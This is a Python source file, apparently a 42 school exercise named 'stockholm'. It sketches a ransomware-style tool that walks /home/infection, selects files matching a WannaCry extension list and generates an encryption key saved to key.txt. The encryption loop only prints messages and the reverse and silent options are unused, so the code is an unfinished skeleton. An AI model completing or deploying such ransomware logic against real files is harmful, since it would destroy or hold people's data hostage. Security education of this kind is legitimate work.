# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: hubourge <hubourge@student.42angouleme.    +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2025/06/18 17:28:06 by hubourge          #+#    #+#              #
#    Updated: 2025/06/18 18:33:59 by hubourge         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import argparse
import sys
import os

def parser():
    parser = argparse.ArgumentParser(
        description="Stockholm will encrypt files at /home/infection directory using a key and add \".ft\" extension to the file."
    )
    parser.add_argument("-v", "-version", action="store_true", help="Show version")
    parser.add_argument("-r", "-reverse", action="store_true", help="Reverse input")
    parser.add_argument("-s", "-silent", action="store_true", help="Silent mode")

    args = parser.parse_args()
    if args.v:
        print("Version 0.1")
        exit(0)
    return args

def checkPermissions(path):
    if not os.path.exists(path):
        print(f"Error: The directory {path} does not exist.")
        sys.exit(1)
    if not os.access(path, os.R_OK):
        print(f"Error: Permission denied to access {path}.")
        sys.exit(1)

def getFiles(path, extension_path):
    try:
        with open(extension_path, "r") as f:
            extension = f.read()
    except FileNotFoundError:
        print(f"Error: The file {extension_path} does not exist.")
        sys.exit(1)

    checkPermissions(path)
    files = []
    for root, dirs, filenames in os.walk(path):
        for filename in filenames:
            fileExtension = '.' + filename.split(".")[-1]
            if fileExtension in extension:
                files.append(os.path.join(root, filename))
    return files

def getNewKey():
    key = os.urandom(16).hex()
    with open("key.txt", "w") as f:
        f.write(key)
    print("Generated new key: %s\n" % key)
    return key

def checkValidKey(key):
    if len(key) != 32 or not all(c in '0123456789abcdef' for c in key):
        print("Error: Invalid key format. Key must be a 32-character hexadecimal string.")
        sys.exit(1)
    return True

def main():
    args = parser()
    files = getFiles("/home/infection", "wannacry_file_extensions.txt")
    
    if not os.path.exists("key.txt"):
        key = getNewKey()
    else:
        with open("key.txt", "r") as f:
            key = f.read()
            checkValidKey(key)
    
    print(f"Using key: {key}")
    for file in files:
        print(f"Encrypting {file}...")

if __name__ == "__main__":
    main()